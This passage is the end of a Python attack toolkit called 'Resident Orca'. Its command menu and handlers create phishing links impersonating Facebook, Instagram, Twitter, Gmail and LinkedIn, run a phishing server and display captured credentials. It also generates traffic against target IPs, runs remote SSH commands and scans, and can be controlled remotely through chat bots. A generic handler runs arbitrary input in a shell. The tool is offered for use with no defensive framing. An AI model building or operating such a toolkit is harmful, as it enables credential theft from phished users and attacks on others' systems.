        port = int(args[1]) if len(args) > 1 else 8080
        result = self.social_tools.start_server(link_id, port)
        return self._create_result(result['success'], result)
    
    def _phishing_stop(self, args):
        self.social_tools.stop_server()
        return self._create_result(True, "Phishing server stopped")
    
    def _phishing_status(self, args):
        return self._create_result(True, {
            'server_running': self.social_tools.server_running,
            'server_url': self.social_tools.get_server_url(),
            'active_links': len(self.social_tools.get_active_links())
        })
    
    def _phishing_links(self, args):
        links = self.social_tools.get_active_links()
        return self._create_result(True, {'links': links, 'total': len(links)})
    
    def _phishing_credentials(self, args):
        link_id = args[0] if args else None
        creds = self.social_tools.get_captured_credentials(link_id)
        return self._create_result(True, creds)
    
    def _phishing_qr(self, args):
        if not args: return self._create_result(False, "Usage: phishing_qr <link_id>")
        qr_path = self.social_tools.generate_qr_code(args[0])
        if qr_path:
            return self._create_result(True, {'path': qr_path})
        return self._create_result(False, "Failed to generate QR code")
    
    def _analyze_ip(self, args):
        if not args: return self._create_result(False, "Usage: analyze_ip <ip>")
        ip = args[0]
        ping = self.tools.ping(ip)
        location = self.tools.get_ip_location(ip)
        threats = self.db.get_recent_threats(5)
        return self._create_result(True, {'ip': ip, 'ping': ping.get('output', '')[:200], 'location': location, 'recent_threats': threats})
    
    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout + result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}

# =====================
# MAIN APPLICATION
# =====================
class ResidentOrca:
    """Main application class"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.ssh = SSHManager(self.db)
        self.traffic_gen = TrafficGenerator(self.db)
        self.nikto = NiktoScanner(self.db)
        self.social_tools = SocialEngineeringTools(self.db)
        self.handler = CommandHandler(self.db, self.ssh, self.traffic_gen, self.nikto, self.social_tools)
        self.discord = DiscordBot(self.handler, self.db)
        self.telegram = TelegramBot(self.handler, self.db)
        self.slack = SlackBot(self.handler, self.db)
        self.imessage = IMessageBot(self.handler, self.db)
        self.web = WebDashboard(self.handler, self.db, self.traffic_gen, self.social_tools)
        self.session_id = self.db.create_session("local_user")
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.NAVY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.LIGHT_BLUE}                    🐋 RESIDENT ORCA v1.0.0                               {Colors.NAVY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.DARK_BLUE}  • 🔐 SSH Remote Access (5+ Platforms)    • 🚀 REAL Traffic Generation     {Colors.NAVY}║
║{Colors.DARK_BLUE}  • 🎣 Social Engineering Suite            • 🕷️ Nikto Web Scanner           {Colors.NAVY}║
║{Colors.DARK_BLUE}  • 🔍 IP Management & Threat Detection    • 📊 Graphical Reports           {Colors.NAVY}║
║{Colors.DARK_BLUE}  • 🤖 Discord/Telegram/Slack/iMessage     • 🌐 Web Dashboard                {Colors.NAVY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.WHITE}💡 Type 'help' for commands | 'status' for system status{Colors.RESET}
{Colors.LIGHT_BLUE}🌐 Web Dashboard: http://localhost:5000{Colors.RESET}
        """
        print(banner)
    
    def print_help(self):
        help_text = f"""
{Colors.NAVY}═══════════════════════ RESIDENT ORCA COMMANDS ═══════════════════════{Colors.RESET}

{Colors.LIGHT_BLUE}📡 NETWORK COMMANDS:{Colors.RESET}
  ping <ip>           - Ping target IP
  scan <ip>           - Port scan (1-1000)
  nmap <ip> [ports]   - Full nmap scan
  traceroute <ip>     - Trace route to target
  whois <domain>      - WHOIS lookup
  dns <domain>        - DNS lookup
  location <ip>       - IP geolocation

{Colors.LIGHT_BLUE}🔐 SSH COMMANDS:{Colors.RESET}
  ssh_list            - List SSH connections
  ssh_connect <name> <host> <user> [pass] - Create connection
  ssh_disconnect <name> - Disconnect
  ssh_execute <name> <cmd> - Execute command
  ssh_upload <name> <local> <remote> - Upload file
  ssh_download <name> <remote> <local> - Download file

{Colors.LIGHT_BLUE}🚀 TRAFFIC GENERATION:{Colors.RESET}
  traffic_types       - List available traffic types
  generate_traffic <type> <ip> <duration> [port] - Generate traffic
  traffic_status      - Active generators
  traffic_stop [id]   - Stop traffic

{Colors.LIGHT_BLUE}🎣 SOCIAL ENGINEERING:{Colors.RESET}
  generate_phishing_link_for_facebook - Create FB phishing
  generate_phishing_link_for_instagram - Create IG phishing
  generate_phishing_link_for_twitter - Create Twitter phishing
  generate_phishing_link_for_gmail - Create Gmail phishing
  generate_phishing_link_for_linkedin - Create LinkedIn phishing
  phishing_start_server <id> [port] - Start phishing server
  phishing_stop_server - Stop server
  phishing_status      - Server status
  phishing_links       - List all links
  phishing_credentials [id] - View captured credentials
  phishing_qr <id>     - Generate QR code

{Colors.LIGHT_BLUE}🕷️ NIKTO WEB SCANNER:{Colors.RESET}
  nikto <target>      - Basic web vulnerability scan
  nikto_full <target> - Full scan with all tests

{Colors.LIGHT_BLUE}🔒 IP MANAGEMENT:{Colors.RESET}
  add_ip <ip>         - Add IP to monitoring
  remove_ip <ip>      - Remove IP from monitoring
  block_ip <ip> [reason] - Block IP via firewall
  unblock_ip <ip>     - Unblock IP
  list_ips            - List managed IPs

{Colors.LIGHT_BLUE}📊 SYSTEM COMMANDS:{Colors.RESET}
  time / date / datetime - Show time/date
  system              - System information
  status              - System status
  threats [limit]     - Recent threats
  report              - Security report
  analyze_ip <ip>     - Comprehensive IP analysis
  clear               - Clear screen
  exit                - Exit application

{Colors.NAVY}════════════════════════════════════════════════════════════════════════{Colors.RESET}
        """
        print(help_text)
    
    def setup_platforms(self):
        """Setup messaging platforms interactively"""
        print(f"\n{Colors.NAVY}═══════════════════════ PLATFORM SETUP ═══════════════════════{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.LIGHT_BLUE}Setup Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input("Enter Discord bot token: ").strip()
            if token:
                self.discord.save_config(token, True)
                self.discord.start_bot_thread()
        
        # Telegram
        setup = input(f"{Colors.LIGHT_BLUE}Setup Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            api_id = input("Enter API ID: ").strip()
            api_hash = input("Enter API Hash: ").strip()
            bot_token = input("Enter Bot Token: ").strip()
            if api_id and api_hash and bot_token:
                self.telegram.save_config(api_id, api_hash, bot_token, True)
                self.telegram.start_bot_thread()
        
        # Slack
        setup = input(f"{Colors.LIGHT_BLUE}Setup Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input("Enter Bot Token: ").strip()
            channel = input("Enter Channel ID (optional): ").strip()
            if token:
                self.slack.save_config(token, channel, True)
                self.slack.start_bot_thread()
        
        # iMessage (macOS only)
        if platform.system().lower() == 'darwin':
            setup = input(f"{Colors.LIGHT_BLUE}Setup iMessage bot? (y/n) [macOS]: {Colors.RESET}").strip().lower()
            if setup == 'y':
                numbers = input("Enter phone numbers to watch (comma separated): ").strip()
                if numbers:
                    num_list = [n.strip() for n in numbers.split(',')]
                    self.imessage.save_config(num_list, True)
                    self.imessage.start_bot_thread()
        
        # Web Dashboard
        setup = input(f"{Colors.LIGHT_BLUE}Start Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            self.web.start()
    
    def process_command(self, command: str):
        if not command.strip():
            return
        
        parts = command.strip().split()
        cmd = parts[0].lower()
        
        if cmd == 'help':
            self.print_help()
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        elif cmd == 'exit':
            self.running = False
            print(f"{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
        else:
            result = self.handler.execute(command)
            if result['success']:
                output = result.get('output', '') or result.get('data', '')
                if isinstance(output, dict):
                    print(json.dumps(output, indent=2))
                else:
                    print(output)
                print(f"{Colors.SUCCESS}✅ Executed in {result.get('execution_time', 0):.2f}s{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Check dependencies
        print(f"{Colors.NAVY}🔍 Checking dependencies...{Colors.RESET}")
        for tool in ['ping', 'nmap', 'curl', 'dig']:
            if shutil.which(tool):
                print(f"  ✅ {tool}")
            else:
                print(f"  ⚠️ {tool} not found")
        
        if not self.ssh.is_available():
            print(f"{Colors.WARNING}⚠️ SSH disabled. Install: pip install paramiko{Colors.RESET}")
        
        # Setup platforms
        self.setup_platforms()
        
        print(f"\n{Colors.SUCCESS}✅ Resident Orca ready! Session ID: {self.session_id}{Colors.RESET}")
        print(f"{Colors.LIGHT_BLUE}🌐 Web dashboard: http://localhost:5000{Colors.RESET}")
        print(f"{Colors.NAVY}════════════════════════════════════════════════════════════════════════{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.NAVY}[{Colors.LIGHT_BLUE}{self.session_id}{Colors.NAVY}]{Colors.RESET} "
                command = input(prompt).strip()
                self.process_command(command)
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
        
        # Cleanup
        self.traffic_gen.stop()
        self.social_tools.stop_server()
        self.ssh.disconnect_all()
        self.db.end_session(self.session_id)
        self.db.close()
        print(f"{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.NAVY}🐋 Starting Resident Orca v1.0.0...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        app = ResidentOrca()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()